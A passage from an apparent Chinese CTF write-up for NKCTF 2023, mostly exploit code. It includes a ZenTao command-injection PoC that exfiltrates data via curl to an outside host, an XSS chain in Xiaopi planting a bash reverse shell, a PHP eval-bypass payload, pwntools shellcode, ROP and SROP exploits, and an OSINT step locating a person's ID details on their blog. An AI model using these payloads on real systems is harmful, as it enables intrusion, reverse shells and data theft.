POC 伪静态传参版</span><br><span class="hljs-string">禅道系统 影响版本 安全版本</span><br><span class="hljs-string">开源版 17.4以下的未知版本&lt;=version&lt;=18.0.beta1 18.0.beta2</span><br><span class="hljs-string">旗舰版 3.4以下的未知版本&lt;=version&lt;=4.0.beta1 4.0.beta2</span><br><span class="hljs-string">企业版 7.4以下的未知版本&lt;=version&lt;=8.0.beta1 8.0.beta2</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">import</span> requests<br><br>proxies = &#123;<br>    <span class="hljs-comment">#&quot;http&quot;: &quot;127.0.0.1:8080&quot;,</span><br>    <span class="hljs-comment">#&quot;https&quot;: &quot;127.0.0.1:8080&quot;,</span><br>&#125;<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>(<span class="hljs-params">url</span>):<br>    <span class="hljs-comment"># url=&quot;http://10.211.55.3:8008&quot;</span><br>    url1 = url+<span class="hljs-string">&#x27;/misc-captcha-user.html&#x27;</span><br>    <span class="hljs-comment"># url1 = url+&#x27;/index.php?m=misc&amp;f=captcha&amp;sessionVar=user&#x27;#非伪静态版本按照此格式传参</span><br>    <span class="hljs-comment"># url2 = url+&#x27;/index.php?m=block&amp;f=printBlock&amp;id=1&amp;module=my&#x27;#可判断验证绕过的链接</span><br>    url3 = url + <span class="hljs-string">&#x27;repo-create.html&#x27;</span><br>    url4 = url + <span class="hljs-string">&#x27;repo-edit-10000-10000.html&#x27;</span><br>    headers=&#123;<br>        <span class="hljs-string">&quot;User-Agent&quot;</span>:<span class="hljs-string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36&quot;</span>,<br>        <span class="hljs-string">&quot;Accept-Language&quot;</span>:<span class="hljs-string">&quot;zh-CN,zh;q=0.9&quot;</span>,<br>        <span class="hljs-string">&quot;Cookie&quot;</span>:<span class="hljs-string">&quot;zentaosid=u6vl6rc62jiqof4g5jtle6pft2; lang=zh-cn; device=desktop; theme=default&quot;</span>,<br>    &#125;<br><br>    headers2 = &#123;<br>        <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36&quot;</span>,<br>        <span class="hljs-string">&quot;Accept-Language&quot;</span>: <span class="hljs-string">&quot;zh-CN,zh;q=0.9&quot;</span>,<br>        <span class="hljs-string">&quot;Cookie&quot;</span>: <span class="hljs-string">&quot;zentaosid=u6vl6rc62jiqof4g5jtle6pft2; lang=zh-cn; device=desktop; theme=default&quot;</span>,<br>        <span class="hljs-string">&quot;Content-Type&quot;</span>:<span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>,<br>        <span class="hljs-string">&quot;X-Requested-With&quot;</span>:<span class="hljs-string">&quot;XMLHttpRequest&quot;</span>,<br>        <span class="hljs-string">&quot;Referer&quot;</span>:url+<span class="hljs-string">&quot;/repo-edit-1-0.html&quot;</span><br>    &#125;<br><br>    data1 = <span class="hljs-string">&#x27;product%5B%5D=1&amp;SCM=Gitlab&amp;name=66666&amp;path=&amp;encoding=utf-8&amp;client=&amp;account=&amp;password=&amp;encrypt=base64&amp;desc=&amp;uid=&#x27;</span><br>    data2 = <span class="hljs-string">&#x27;SCM=Subversion&amp;client=`curl http://tmar9l37.requestrepo.com/?1=\\`cat /flag|grep NKCTF|base64\\``&#x27;</span><br>    s=requests.session()<br>    <span class="hljs-keyword">try</span>:<br>        req1 = s.get(url1,proxies=proxies,timeout=<span class="hljs-number">5</span>,verify=<span class="hljs-literal">False</span>,headers=headers)<br>        req3 = s.post(url3,data=data1,proxies=proxies,timeout=<span class="hljs-number">5</span>,verify=<span class="hljs-literal">False</span>,headers=headers2)<br>        req4 = s.post(url4,data=data2,proxies=proxies,timeout=<span class="hljs-number">5</span>,verify=<span class="hljs-literal">False</span>,headers=headers2)<br>        <span class="hljs-built_in">print</span>(req4.text)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(e)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-built_in">print</span>(check(<span class="hljs-string">&quot;http://9dab2a42-f651-4ef6-86a7-a356af0c7437.node2.yuzhian.com.cn/&quot;</span>))<br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/easy_pms-1.png"></p><h2 id="xiaopi"><a href="#xiaopi" class="headerlink" title="xiaopi"></a>xiaopi</h2><p>小皮存储型XSS-&gt;rce</p><p><a href="https://blog.csdn.net/weixin_46944519/article/details/128954060">参考文章</a></p><p>请求头加上<code>X-Requested-With: XMLHttpRequest</code>就能访问登录框</p><p>vps上放定时任务，反弹shell</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">poc</span>(<span class="hljs-params"></span>)&#123;<br>  $.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/service/app/tasks.php?type=task_list&#x27;</span>,&#123;&#125;,<span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>)&#123;<br>    <span class="hljs-keyword">var</span> id=data.<span class="hljs-property">data</span>[<span class="hljs-number">0</span>].<span class="hljs-property">ID</span>;<br>    $.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/service/app/tasks.php?type=exec_task&#x27;</span>,&#123;<br>      <span class="hljs-attr">tid</span>:id<br>    &#125;,<span class="hljs-keyword">function</span>(<span class="hljs-params">res2</span>)&#123;<br>        $.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/service/app/log.php?type=clearlog&#x27;</span>,&#123;<br><br>        &#125;,<span class="hljs-keyword">function</span>(<span class="hljs-params">res3</span>)&#123;&#125;,<span class="hljs-string">&quot;json&quot;</span>);<br><br><br>    &#125;,<span class="hljs-string">&quot;json&quot;</span>);<br>  &#125;,<span class="hljs-string">&quot;json&quot;</span>);<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">save</span>(<span class="hljs-params"></span>)&#123;<br>  <span class="hljs-keyword">var</span> data=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();<br>  data.<span class="hljs-property">task_id</span>=<span class="hljs-string">&quot;&quot;</span>;<br>  data.<span class="hljs-property">title</span>=<span class="hljs-string">&quot;test&quot;</span>;<br>  data.<span class="hljs-property">exec_cycle</span>=<span class="hljs-string">&quot;1&quot;</span>;<br>  data.<span class="hljs-property">week</span>=<span class="hljs-string">&quot;1&quot;</span>;<br>  data.<span class="hljs-property">day</span>=<span class="hljs-string">&quot;3&quot;</span>;<br>  data.<span class="hljs-property">hour</span>=<span class="hljs-string">&quot;16&quot;</span>;<br>  data.<span class="hljs-property">minute</span> = <span class="hljs-string">&quot;35&quot;</span>;<br>  data.<span class="hljs-property">shell</span>=<span class="hljs-string">&#x27;bash -i &gt;&amp; /dev/tcp/20.2.129.79/8888 0&gt;&amp;1&#x27;</span>;<br>  $.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/service/app/tasks.php?type=save_shell&#x27;</span>,data,<span class="hljs-keyword">function</span>(<span class="hljs-params">res</span>)&#123;<br>    <span class="hljs-title function_">poc</span>();<br>  &#125;,<span class="hljs-string">&#x27;json&#x27;</span>);<br>&#125;<br><span class="hljs-title function_">save</span>();<br></code></pre></td></tr></table></figure><p><code>python</code>开启一个<code>http</code>服务</p><p><code>python3 -m http.server 7777</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/xiaopi-2.png"></p><p>在登录处用户名框中插入<code>&lt;script src=http://20.2.129.79:7777/1.js&gt;&lt;/script&gt;</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/xiaopi-1.png"></p><p>插入完后等待管理员bot登录，触发计划任务，反弹shell</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/xiaopi-3.png"></p><h2 id="hard-php"><a href="#hard-php" class="headerlink" title="hard_php"></a>hard_php</h2><p><strong>赛后复现</strong></p><p>ctfshow的题目加上一些函数禁用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// not only ++</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;NKCTF&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$NK</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;NKCTF&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$NK</span>)) &#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-zA-Z0-9@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>,<span class="hljs-variable">$NK</span>) &amp;&amp; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$NK</span>) &lt; <span class="hljs-number">105</span>)&#123;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$NK</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;hacker!!!&quot;</span>);<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-title function_ invoke__">phpinfo</span>();<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>NKCTF=$_=(０/０)._;$_=$_[&#39;&#39;==&#39;$&#39;];$_++;$__=$_++;$__=$_++.$__;$_++;$_++;$_=&#39;_&#39;.$__.($_++).$_;$$_[__]($$_[_]);&amp;__=shell_exec&amp;_=echo `cat /flag`&gt;/var/www/html/3.txt</code></p><p>url编码后上传</p><h1 id="Social-Engineering"><a href="#Social-Engineering" class="headerlink" title="Social Engineering"></a>Social Engineering</h1><h2 id="Bridge"><a href="#Bridge" class="headerlink" title="Bridge"></a>Bridge</h2><p>百度识图得到关键信息<code>海口</code>，进新闻得到<code>世纪大桥</code>，在<code>世纪大桥</code>旁边有一个<code>世纪公园</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/Bridge-1.png"></p><p><code>NKCTF&#123;海南省海口市龙华区世纪公园&#125;</code></p><h2 id="两个人的夜晚"><a href="#两个人的夜晚" class="headerlink" title="两个人的夜晚"></a>两个人的夜晚</h2><p>根据图上的<code>NCC新城市中心</code>去百度地址</p><p><code>NKCTF&#123;天津市西青区中北镇万卉路3号NCC新城市中心&#125;</code></p><h2 id="狂飙"><a href="#狂飙" class="headerlink" title="狂飙"></a>狂飙</h2><p>抖音搜狂飙取景地得到<code>莲平路</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/%E7%8B%82%E9%A3%99-1.png"></p><p><code>NKCTF&#123;广东省江门市蓬江区莲平路&#125;</code></p><h2 id="real-social-engineering"><a href="#real-social-engineering" class="headerlink" title="real-social-engineering"></a>real-social-engineering</h2><p>github搜他id，找到博客地址：<a href="https://tacooo0o.github.io/">https://tacooo0o.github.io/</a></p><p>在<code>2021年终总结</code>这篇文章中找到驾驶证图片，包含了身份证信息</p><p><code>NKCTF&#123;6107**********4710&#125;</code></p><h2 id="Ferris-Wheel"><a href="#Ferris-Wheel" class="headerlink" title="Ferris_Wheel"></a>Ferris_Wheel</h2><p>百度识图得到<code>永川</code>，<code>摩天轮</code>，<code>渝西</code>等关键词</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/Ferris_Wheel-1.png"></p><p>百度地图找到渝西之眼，组合爆破下地名</p><p><code>NKCTF&#123;重庆市永川区兴龙湖CBD永川里奥特莱斯渝西之眼摩天轮&#125;</code></p><h2 id="旅程的开始"><a href="#旅程的开始" class="headerlink" title="旅程的开始"></a>旅程的开始</h2><p>百度地图搜<code>中铁酒店</code>，得到<code>贵阳火车站</code>，实景一点一点与图片对比</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/%E6%97%85%E7%A8%8B%E7%9A%84%E5%BC%80%E5%A7%8B-1.png"></p><p><code>NKCTF&#123;贵州省贵阳市南明区遵义路1号&#125;</code></p><h2 id="The-other-Bridge"><a href="#The-other-Bridge" class="headerlink" title="The other Bridge"></a>The other Bridge</h2><p>百度识图，得到<code>戴家巷崖壁步道</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/The%20other%20Bridge-1.png"></p><p>根据提示加个<code>畔</code></p><p><code>NKCTF&#123;重庆市江北区嘉陵江畔戴家巷崖壁步道&#125;</code></p><h2 id="decompile"><a href="#decompile" class="headerlink" title="decompile"></a>decompile</h2><p>步骤与上面的<code>decompile_revenge</code>一样</p><p><code>NKCTF&#123;N0w_you_kn0w_d3compl1te_bytecode&#125;</code></p><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="ezshellcode"><a href="#ezshellcode" class="headerlink" title="ezshellcode"></a>ezshellcode</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>e=ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>context.binary=e<br><span class="hljs-comment">#p=process(&#x27;./pwn&#x27;)</span><br>p=remote(<span class="hljs-string">&quot;node.yuzhian.com.cn:32220&quot;</span>)<br>shell=asm(shellcraft.sh()).rjust(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;\x90&#x27;</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;min!&#x27;</span>,shell)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="a-story-of-a-pwner"><a href="#a-story-of-a-pwner" class="headerlink" title="a_story_of_a_pwner"></a>a_story_of_a_pwner</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p=process(&#x27;./pwn&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;node.yuzhian.com.cn:36024&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>e=ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>context.binary=e<br><br>p.sendlineafter(<span class="hljs-string">&#x27;&gt; \n&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>p.readuntil(<span class="hljs-string">&#x27;see this. &#x27;</span>)<br><br>d=<span class="hljs-built_in">int</span>(p.readline().decode().strip(),<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d))<br><br>libc.address=d-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc.address))<br><br>rdi=libc.address+<span class="hljs-number">0x0019764d</span><br>bin_sh=<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>p.sendlineafter(<span class="hljs-string">&#x27;&gt; \n&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.sendafter(<span class="hljs-string">&#x27;comment?&#x27;</span>,p64(bin_sh))<br><br>p.sendlineafter(<span class="hljs-string">&#x27;&gt; \n&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>p.sendafter(<span class="hljs-string">&#x27;corment?&#x27;</span>,p64(rdi))<br><br>p.sendlineafter(<span class="hljs-string">&#x27;&gt; \n&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>p.sendafter(<span class="hljs-string">&#x27;corMenT?&#x27;</span>,p64(system))<br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xa</span>+p64(<span class="hljs-number">0x405098</span>)+p64(<span class="hljs-number">0x401502</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;&gt; \n&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>p.send(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="ez-stack"><a href="#ez-stack" class="headerlink" title="ez_stack"></a>ez_stack</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>e=ELF(<span class="hljs-string">&#x27;./ez_stack&#x27;</span>)<br>context.binary=e<br>ax_f=<span class="hljs-number">0x401146</span><br>syscall=<span class="hljs-number">0x40114e</span><br>bss=e.bss(<span class="hljs-number">0x400</span>)<br><br><span class="hljs-comment">#p=process(&#x27;./ez_stack&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;node2.yuzhian.com.cn&#x27;</span>,<span class="hljs-string">&#x27;39605&#x27;</span>)<br><br>sig=SigreturnFrame()<br>sig.rax=<span class="hljs-number">0</span><br>sig.rip=syscall<br>sig.rdi=<span class="hljs-number">0</span><br>sig.rsi=bss<br>sig.rdx=<span class="hljs-number">0x200</span><br>sig.rsp=bss+<span class="hljs-number">8</span><br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(ax_f)+p64(syscall)+flat(sig)<br><br>p.sendafter(<span class="hljs-string">&#x27;NKCTF!\n&#x27;</span>,payload)<br><br>sig1=SigreturnFrame()<br>sig1.rax=<span class="hljs-number">59</span><br>sig1.rdi=bss<br>sig1.rsi=<span class="hljs-number">0</span><br>sig1.rdx=<span class="hljs-number">0</span><br>sig1.rsp=bss+<span class="hljs-number">0x200</span><br>sig1.rip=syscall<br><br>payload1=<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>+p64(ax_f)+p64(syscall)+flat(sig1)<br>p.send(payload1)<br><br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="baby-rop"><a href="#baby-rop" class="headerlink" title="baby_rop"></a>baby_rop</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>debug=<span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">if</span> debug==<span class="hljs-number">1</span>:<br>        p=process(<span class="hljs-string">&quot;./nkctf_message_boards&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        p=remote(<span class="hljs-string">&#x27;node2.yuzhian.com.cn:31457&#x27;</span>)<br>    <span class="hljs-keyword">try</span>:<br><br>        e=ELF(<span class="hljs-string">&quot;nkctf_message_boards&quot;</span>)<br>        func=<span class="hljs-string">&#x27;puts&#x27;</span><br>        func_got=e.got[func]<br>        puts=e.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>        rdi=<span class="hljs-number">0x00401413</span><br>        leave=<span class="hljs-number">0x40138a</span><br>        bss=e.bss(<span class="hljs-number">0x200</span>)<br>        read=<span class="hljs-number">0x401351</span><br>        main=e.sym[<span class="hljs-string">&#x27;main&#x27;</span>]<br>        ret=<span class="hljs-number">0x00401434</span><br>        <span class="hljs-comment">#gdb.attach(p,&#x27;bp 0x401318\nbp 0x40138a&#x27;)</span><br>        p.sendlineafter(<span class="hljs-string">&#x27;name: &#x27;</span>,<span class="hljs-string">b&#x27;%41$p&#x27;</span>)<br>        p.readuntil(<span class="hljs-string">&#x27;Hello, &#x27;</span>)<br>        canary=<span class="hljs-built_in">int</span>(p.readuntil(<span class="hljs-string">&#x27;What&#x27;</span>,drop=<span class="hljs-number">1</span>),<span class="hljs-number">16</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(canary))<br>        n=<span class="hljs-number">0x30</span><br>        pad=<span class="hljs-string">b&#x27;a&#x27;</span>*n<br>        payload=pad+p64(ret)*<span class="hljs-number">13</span>+p64(rdi)+p64(func_got)+p64(puts)+p64(main)<br>        payload=payload.ljust(<span class="hljs-number">0xf8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>        payload+=p64(canary)<br>        p.sendafter(<span class="hljs-string">&#x27;NKCTF: &#x27;</span>,payload)<br>        p.readuntil(<span class="hljs-string">&#x27;carefully.\n&#x27;</span>)<br>        d=u64(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d))<br>        <span class="hljs-keyword">if</span> debug==<span class="hljs-number">1</span>:<br>            libc=ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc-2.33.so&quot;</span>)<br>            libc.address=d-libc.sym[func]<br>            system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>            bin_sh=<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>))<br>            gdb.attach(p)<br>        <span class="hljs-keyword">else</span>:<br>            libc=LibcSearcher(func,d)<br>            system=libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>            bin_sh=libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br><br>        payload=p64(ret)*<span class="hljs-number">0x1a</span>+p64(rdi)+p64(bin_sh)+p64(system)+p64(main)<br>        payload+=p64(ret)<br>        payload+=p64(canary)<br><br>        p.sendlineafter(<span class="hljs-string">&#x27;name: &#x27;</span>,<span class="hljs-string">b&#x27;%41$p&#x27;</span>)<br>        p.sendafter(<span class="hljs-string">&#x27;NKCTF: &#x27;</span>,payload)<br><br>        p.interactive()<br>    <span class="hljs-keyword">except</span>:<br><br>        <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">try</span>:<br>        p.close()<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure><h2 id="baby-heap"><a href="#baby-heap" class="headerlink" title="baby_heap"></a>baby_heap</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>e=ELF(<span 